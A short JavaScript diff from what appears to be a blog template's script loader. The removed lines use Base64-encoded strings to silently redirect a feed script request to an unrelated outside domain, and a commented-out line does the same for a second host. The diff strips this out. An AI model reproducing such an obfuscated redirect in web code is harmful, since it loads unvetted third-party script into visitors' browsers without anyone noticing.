@@ -55,9 +55,7 @@ function nobars(json) {
 
 	
 var script = document.createElement('script');
-var gntMVL = fee 	.replace(Base64.decode("YXM2NGQ5OHdydzUyMTN0MTQ2NTUxZDIzZjF2c2QzMWYyLmJsb2dzcG90LmNvbQ=="),Base64.decode("anMubW92aWVsdWNrLm1s"))
-			+//.replace(Base64.decode("ZmlsZXMtZ29vZ2xlLWNvZGUtZm9yLW15LXMwY2lhbC1tZWRpYS5ibG9nc3BvdC5jb20="),Base64.decode("amFuY29rLWtvZS5pZGJsb2cuZXUub3Jn"))+
-	     Base64.decode("P2FsdD0=")+"json"+Base64.decode("JmNhbGxiYWNrPQ==")+"nobars";
+var gntMVL = fee+Base64.decode("P2FsdD0=")+"json"+Base64.decode("JmNhbGxiYWNrPQ==")+"nobars";
 script.src = gntMVL;
 
 document.getElementsByTagName('head')[0].appendChild(script); 
